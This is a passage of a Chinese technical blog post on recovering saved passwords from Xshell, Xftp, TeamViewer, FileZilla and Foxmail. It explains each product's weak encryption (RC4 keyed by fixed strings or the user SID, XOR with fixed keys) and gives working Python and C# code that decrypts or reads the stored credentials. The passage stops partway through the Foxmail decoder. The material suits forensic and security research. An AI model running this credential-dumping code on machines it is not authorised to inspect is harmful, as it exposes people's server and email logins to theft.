class="keyword">is</span> <span class="keyword">not</span> obfuscating password. Xshell <span class="keyword">uses</span> RC4 <span class="keyword">with</span> SHA256.</span><br></pre></td></tr></table></figure><p>当然，这是 5.1 版本之后所使用的。</p><p>如今的 <code>Xmanager</code> 大致可分为 2 个大版本。版本名及产生的 <code>session</code> 文件位置如下：</p><table><tr><th width="20%" bgcolor="#eea236">产品 </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">会话文件位置</th></tr><tr><td> XShell 5 </td><td> %userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td> XFtp 5 </td><td> %userprofile%\Documents\NetSarang\Xftp\Sessions</td></tr><tr><td> XShell 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td> XFtp 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions</td></tr></table><p>以下以 <code>XShell 6</code> 为例</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-22_09-27-08.png" alt=""></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-22_09-28-25.png" alt=""></p><h3 id="3-1-如何加密"><a href="#3-1-如何加密" class="headerlink" title="3.1 如何加密"></a>3.1 如何加密</h3><p>​    版本的不同，其加密方式也不一样。以下为默认设置下的加密行为。</p><ul><li><p><strong>版本 &lt; 5.1</strong></p><p><code>Xshell</code> 采用以字符串<code>!X@s#h$e%l^l&amp;</code> 的 MD5 值作为作为 <code>RC4 加密算法</code>中的密钥，以下是加密实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = ba2d9b7e9cca73d152b26772662df55e</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#h$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># +amcdP4=</span></span><br></pre></td></tr></table></figure><p><code>Xftp</code> 同理，以 <code>!X@s#c$e%l^l&amp;</code> 的 MD5 值作为密钥，与 Xshell 所使用的字符串仅一个字符之分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = 306e9835de9291d227bb28b2f72dca33</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#c$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># SvmUuQg=</span></span><br></pre></td></tr></table></figure></li><li><p><strong>版本 = 5.1 or 5.2</strong></p><p><code>Xshell</code> 和 <code>Xftp</code> 都使用 <code>SHA-256 摘要算法</code>生成密钥，作为 <code>RC4 加密</code>中使用的密钥。</p><p>以当前<code>用户账户的 SID</code> 作为 SHA-256 摘要，长度为 32 个字节的数组。SID 可通过 <code>whoami /user</code> 进行获取，如下所示：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\RcoIl&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名         SID</span><br><span class="line">============== =============================================</span><br><span class="line">rcoil-pc\rcoil S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: a6a7f87e9ab607e8ec70446569ff86919a55417c9259b8e866afb1403fb17a27</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0xA6</span>, <span class="number">0xA7</span>, <span class="number">0xF8</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xB6</span>, <span class="number">0x07</span>, <span class="number">0xE8</span>, <span class="number">0xEC</span>, <span class="number">0x70</span>, <span class="number">0x44</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x69</span>, <span class="number">0xFF</span>, <span class="number">0x86</span>, <span class="number">0x91</span>, <span class="number">0x9A</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x7C</span>, <span class="number">0x92</span>, <span class="number">0x59</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0xAF</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0xB1</span>, <span class="number">0x7A</span>, <span class="number">0x27</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>版本 &gt; 5.2</strong></p><p>而 5.2 版本之后的 <code>Xshell</code> 与 <code>Xftp</code>，与之前只是多加了一个用户名。如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#user+sid</span></span><br><span class="line">RcoIlS<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: <span class="number">5e53</span>a13c5e98d02f8100ce62deb6e0dfec2a2361ba3c7fdd84dceb00554264bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0x53</span>, <span class="number">0xA1</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0x98</span>, <span class="number">0xD0</span>, <span class="number">0x2F</span>, <span class="number">0x81</span>, <span class="number">0x00</span>, <span class="number">0xCE</span>, <span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0xB6</span>, <span class="number">0xE0</span>, <span class="number">0xDF</span>, <span class="number">0xEC</span>, <span class="number">0x2A</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x3C</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>,</span><br><span class="line"><span class="number">0x84</span>, <span class="number">0xDC</span>, <span class="number">0xEB</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x42</span>, <span class="number">0x64</span>, <span class="number">0xBB</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>设置了  Master Key 的情况下（5.1 版本之后）</p><p>如果设置了 主密码，则以主密码的 <code>SHA-256摘要</code>作为 <code>RC4 加密</code>中使用的密钥。例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Master Key:yingyingying</span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0xF9</span>, <span class="number">0xB6</span>, <span class="number">0x86</span>, <span class="number">0xF8</span>, <span class="number">0xE1</span>, <span class="number">0xCE</span>, <span class="number">0x51</span>, <span class="number">0xCB</span>, <span class="number">0xCD</span>, <span class="number">0xCB</span>, <span class="number">0x2F</span>,</span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x2B</span>, <span class="number">0x33</span>, <span class="number">0xB4</span>, <span class="number">0x3B</span>, <span class="number">0x17</span>, <span class="number">0xF3</span>, <span class="number">0xE6</span>, <span class="number">0xE9</span>, <span class="number">0x40</span>, <span class="number">0x23</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x68</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0xEC</span>, <span class="number">0xD6</span>, <span class="number">0x59</span>, <span class="number">0xF5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-2-加密过程（C-）"><a href="#3-2-加密过程（C-）" class="headerlink" title="3.2 加密过程（C#）"></a>3.2 加密过程（C#）</h3><p>​        假设我们的密码是 <code>root</code>，则它的 <code>SHA-256 摘要</code>将作为附加加密数据。</p> <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x13</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x13</span>, <span class="number">0x7E</span>, <span class="number">0x16</span>, <span class="number">0x31</span>, <span class="number">0xBB</span>, <span class="number">0xA3</span>, <span class="number">0x01</span>, <span class="number">0xD5</span>,</span><br><span class="line"><span class="number">0xAC</span>, <span class="number">0xAB</span>, <span class="number">0x6E</span>, <span class="number">0x7B</span>, <span class="number">0xB7</span>, <span class="number">0xAA</span>, <span class="number">0x74</span>, <span class="number">0xCE</span>, <span class="number">0x11</span>, <span class="number">0x85</span>, <span class="number">0xD4</span>, <span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0xF5</span>, <span class="number">0x1D</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0xB2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"root"</span></span><br><span class="line">cipher = ARC4.new(SHA256.new(UserSid).digest())</span><br><span class="line">checksum = SHA256.new(rawPass).digest()</span><br><span class="line">ciphertext = cipher.encrypt(rawPass)</span><br><span class="line"><span class="keyword">print</span> b64encode(ciphertext + checksum).decode()</span><br><span class="line"></span><br><span class="line">==》 klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-解密过程（C-）"><a href="#3-3-解密过程（C-）" class="headerlink" title="3.3 解密过程（C#）"></a>3.3 解密过程（C#）</h3><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span></span><br><span class="line">data = b64decode(rawPass)</span><br><span class="line">Cipher = ARC4.new(SHA256.new((UserSid).encode()).digest())</span><br><span class="line">ciphertext, checksum = data[:-SHA256.digest_size], data[-SHA256.digest_size:]</span><br><span class="line">plaintext = Cipher.decrypt(ciphertext)</span><br><span class="line"><span class="keyword">print</span> plaintext.decode()</span><br></pre></td></tr></table></figure></li><li><p><strong><em>C# 版本</em></strong></p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span>;</span><br><span class="line"><span class="keyword">string</span> rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] data = Convert.FromBase64String(rawPass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = <span class="keyword">new</span> SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] passData = <span class="keyword">new</span> <span class="keyword">byte</span>[data.Length - <span class="number">0x20</span>];</span><br><span class="line">Array.Copy(data, <span class="number">0</span>, passData, <span class="number">0</span>, data.Length - <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">byte</span>[] decrypted = RC4Crypt.Decrypt(Key, passData);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">"Decrypt: &#123;0&#125;"</span>, Encoding.ASCII.GetString(decrypted));</span><br><span class="line"></span><br><span class="line"> ==》 Decrypt: root</span><br></pre></td></tr></table></figure></li></ul><p><strong>结果如下所示：</strong></p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_09-32-36.png" alt=""></p><p>以上所有测试均为工作组环境，因为在域环境解密失败，原因未知。</p><h2 id="0x04-TeamView"><a href="#0x04-TeamView" class="headerlink" title="0x04 TeamView"></a>0x04 TeamView</h2><p>直接是通过获取 <code>TeamView</code> 的句柄，把窗体上所有控件的变量给读出来。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">EnumFunc</span>(<span class="params">IntPtr hWnd, IntPtr lParam</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> WM_GETTEXT = <span class="number">0x0D</span>;</span><br><span class="line">    GetClassNameW(hWnd, sb, sb.Capacity);</span><br><span class="line">    <span class="keyword">if</span> (sb.ToString() == <span class="string">"Edit"</span> || sb.ToString() == <span class="string">"Static"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WindowInfo wnd = <span class="keyword">new</span> WindowInfo();</span><br><span class="line">        wnd.hWnd = hWnd;</span><br><span class="line">        wnd.szClassName = sb.ToString();</span><br><span class="line">        <span class="keyword">if</span> (wnd.szClassName == <span class="string">"Edit"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">            SendMessage(hWnd, WM_GETTEXT, <span class="number">256</span>, stringBuilder);</span><br><span class="line">            wnd.szWindowName = stringBuilder.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            GetWindowTextW(hWnd, sb, sb.Capacity);</span><br><span class="line">            wnd.szWindowName = sb.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Console.WriteLine("句柄=" + wnd.hWnd.ToString().PadRight(20) + " 类型=" + wnd.szClassName.PadRight(20) + " 名称=" + wnd.szWindowName);</span></span><br><span class="line">        <span class="comment">//add it into list</span></span><br><span class="line">        wndList.Add(wnd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了其兼容性，不对结果进行筛选，输出全部窗体内容信息</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_14-40-13.png" alt=""></p><h2 id="0x05-FileZilla"><a href="#0x05-FileZilla" class="headerlink" title="0x05 FileZilla"></a>0x05 FileZilla</h2><p>从网上收集的信息得到：</p><ul><li><p>在 <code>Filezilla 2.X</code> 版本中，密码正在进行异或处理并存储在 Registry 中;</p></li><li><p>在 <code>Filezilla 3.x</code> 版本中，密码以明文形式存储在 <code>.xml文件</code>中。</p><p>  如今官方的最新版本为 <code>FileZilla_3.44.2_win64_sponsored-setup</code>，以此版本进行测试：</p><p>  <img src="/image/【编程】SharpDecryptPwd/blog_2019-08-26_09-47-20.png" alt=""></p></li></ul><p>​        直接读取 相关xml 的内容即可（<strong><em>recentservers.xml</em></strong>）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fileZilla</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), <span class="string">@"FileZilla\recentservers.xml"</span>);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (File.Exists(FzPath))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> objXmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">                        objXmlDocument.Load(FzPath);</span><br><span class="line">                        Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, <span class="string">"Host"</span>, <span class="string">"Port"</span>, <span class="string">"Username"</span>, <span class="string">"ratPass"</span>);</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="function">XmlElement XE <span class="title">in</span> (<span class="params">(XmlElement</span>)objXmlDocument.<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"RecentServers"</span></span>)[0]).<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"Server"</span></span>))</span></span><br><span class="line"><span class="function"></span>                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> Host = XE.GetElementsByTagName(<span class="string">"Host"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> Port = XE.GetElementsByTagName(<span class="string">"Port"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> User = XE.GetElementsByTagName(<span class="string">"User"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line">                            <span class="keyword">var</span> Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName(<span class="string">"Pass"</span>)[<span class="number">0</span>].InnerText)));</span><br><span class="line">                            <span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(Host) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Port) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(User) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Pass))</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, Host, Port, User, Pass);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>​        效果如下</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-26_10-17-43.png" alt=""></p><h2 id="0x06-Foxmail"><a href="#0x06-Foxmail" class="headerlink" title="0x06 Foxmail"></a>0x06 Foxmail</h2><p><code>Foxmail</code> 将输入的密码和一个固定字符串做异或加密，然后在前面添加字符串 <code>Password</code> ，用于标记作用。</p><table><tr><th width="20%" bgcolor="#eea236">版本号 </th><th width="40%" bgcolor="#eea236">存储文件 </th><th width="40%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">固定异或字符串(加密密钥)</th></tr><tr><td> Version 6.X </td><td> Account.stg -v6.5</td><td> ~draGon~  第一位异或值：5A</td></tr><tr><td> Version 7.X </td><td> Accounts.tdat -v7.0 Account.rec0 -v7.1</td><td> ~F@7％m$~  第一位异或值：71</td></tr></table><p>至于为什么是这个值，可以直接逆向查看，或者看看这篇文章 <a href="https://wenku.baidu.com/view/1fcaf49cda38376baf1faeff" target="_blank" rel="noopener">foxmail 邮箱密码密码原理和方法研究</a>。</p><p><strong>Foxmail Version 6.x 加密方法：</strong> </p><ul><li><p>将原密文的第一位 16进制与 <code>5A</code> 进行 <code>XOR异或</code> 操作，然后替换掉原密文的第一位后，得到一个新密文</p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>A 的由来</span><br><span class="line"><span class="keyword">string</span> key = <span class="string">"~draGon~"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] data = Encoding.Default.GetBytes(key);</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">x += <span class="keyword">int</span>.Parse(data[i].ToString());</span><br><span class="line">&#125;</span><br><span class="line">x %= <span class="number">255</span>;</span><br><span class="line">Console.WriteLine(x); <span class="comment">// 90 =&gt; 5A</span></span><br></pre></td></tr></table></figure></li><li><p>再将新密文从第二位开始分别与密钥 <code>~draGon~</code>（7E647261476F6E7E）进行 <code>XOR异或</code>，并将此时得到的密文与原密文进行相减，得到明文的 16进制。</p></li><li><p><code>Account.stg</code>  文件使用二进制格式存储并在前 <code>0x800 字节</code>内填充了一些十六进制数据，之后才是真正的账户信息，包括 POP3 和 SMTP 账户、密码。</p></li><li><p>POP3 和 SMTP 账户密码分别用 “POP3Password” 和 “ESMTPPassword” 来代表。密码使用十六进制格式并用 XOR 异或加密，密钥为“~draGon~”。</p></li></ul><p><strong>版本 7.X 同理。</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> Foxmail password decoder</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> Credit: Jacob Soo</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> https://github.com/jacobsoo/FoxmailRecovery/blob/c3263424dd961ec23868d03c9caad13fa5c017ee/Foxmail%20Password%20Recovery/Foxmail%20Password%20Recovery/SharedFunctions.cs#L72</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> https://github.com/lim42snec/foxmaildump/blob/ca29edc6d767b4e52ee939cdad1d0f8cd7c9f626/FoxmailDump.cpp#L34</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="ver"&gt;</span>版本号<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="pHash"&gt;</span>密文<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decodePW</span>(<span class="params"><span class="keyword">int</span> ver, String strHash</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            String decodedPW = <span class="string">""</span>;</span><br><span class="line">            <span class="comment">// 第一步：定义不同版本的秘钥</span></span><br><span class="line">            <span class="keyword">int</span>[] a;</span><br><span class="line">            <span class="comment">// fc0 的值是根据版本密钥，以字节为单位将16进制密文转成10进制，十进制之和求余。（x %=255;）</span></span><br><span class="line">            <span class="keyword">int</span> fc0;</span><br><span class="line"></span><br><span class="line">            